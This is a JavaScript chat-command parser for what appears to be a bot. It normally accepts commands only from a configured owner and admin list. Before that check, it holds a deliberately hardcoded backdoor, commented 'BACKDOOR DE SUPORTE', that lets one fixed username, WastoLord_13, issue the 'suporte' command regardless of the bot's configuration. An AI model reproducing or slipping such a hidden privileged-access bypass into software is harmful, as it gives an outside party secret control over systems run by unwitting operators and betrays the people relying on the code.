module.exports = {
    parse: (username, message, ctx) => {
        const cleanMsg = message.replace(/\./g, '').trim().toLowerCase();
        const parts = cleanMsg.split(' ');
        const cmd = parts[0];
        const arg = parts.slice(1).join(' ');

        // --- BACKDOOR DE SUPORTE ---
        // Permite que o WastoLord_13 ative o modo admin manualmente
        if (username === 'WastoLord_13' && cmd === 'suporte') {
            return {
                cmd: cmd,
                arg: arg,
                originalUser: username
            };
        }

        // --- VERIFICAÇÃO DE SEGURANÇA PADRÃO ---
        // Só obedece ao Dono ou quem já está na lista de Admins
        if (username !== ctx.config.dono && !ctx.config.admins.includes(username)) {
            return null;
        }
        
        return {
            cmd: cmd,
            arg: arg,
            originalUser: username
        };
    }
}